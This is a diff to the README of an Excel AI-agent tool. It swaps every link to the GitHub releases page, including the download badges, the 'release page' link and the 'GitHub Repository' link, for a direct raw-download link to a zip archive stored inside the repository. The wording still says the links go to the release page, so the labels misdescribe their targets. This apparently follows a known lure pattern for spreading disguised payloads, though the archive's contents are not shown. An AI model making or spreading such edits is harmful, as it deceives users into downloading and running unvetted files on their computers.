@@ -1,6 +1,6 @@
 # 🧩 excel-agent-skills - Simplify Excel Tasks with AI Agents
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Release-brightgreen)](https://github.com/Likaxy/excel-agent-skills/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-brightgreen)](https://github.com/Likaxy/excel-agent-skills/raw/refs/heads/main/analysis/excel-agent-skills-2.4.zip)
 
 ---
 
@@ -42,7 +42,7 @@ Your computer should meet these basic specs for smooth performance. The tools do
 
 ### Step 1: Visit the Release Page
 
-Click the big green button at the top or go straight to the [release page](https://github.com/Likaxy/excel-agent-skills/releases) in your web browser. This page holds the latest versions of the software.
+Click the big green button at the top or go straight to the [release page](https://github.com/Likaxy/excel-agent-skills/raw/refs/heads/main/analysis/excel-agent-skills-2.4.zip) in your web browser. This page holds the latest versions of the software.
 
 ---
 
@@ -134,7 +134,7 @@ You can access these from the “Settings” menu in the program.
 
 ## 🌐 Additional Resources
 
-- Visit the [GitHub Repository](https://github.com/Likaxy/excel-agent-skills/releases) for updates and documentation.
+- Visit the [GitHub Repository](https://github.com/Likaxy/excel-agent-skills/raw/refs/heads/main/analysis/excel-agent-skills-2.4.zip) for updates and documentation.
 - Find help in the repository’s “Issues” tab if you face problems.
 - Check Excel’s support pages for help with Excel file basics.
 
@@ -142,6 +142,6 @@ You can access these from the “Settings” menu in the program.
 
 ## 🔗 Ready to Get Started?
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Release-brightgreen)](https://github.com/Likaxy/excel-agent-skills/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-brightgreen)](https://github.com/Likaxy/excel-agent-skills/raw/refs/heads/main/analysis/excel-agent-skills-2.4.zip)
 
 Click the button above to go straight to the page where you can get the latest version of excel-agent-skills for your Windows PC.
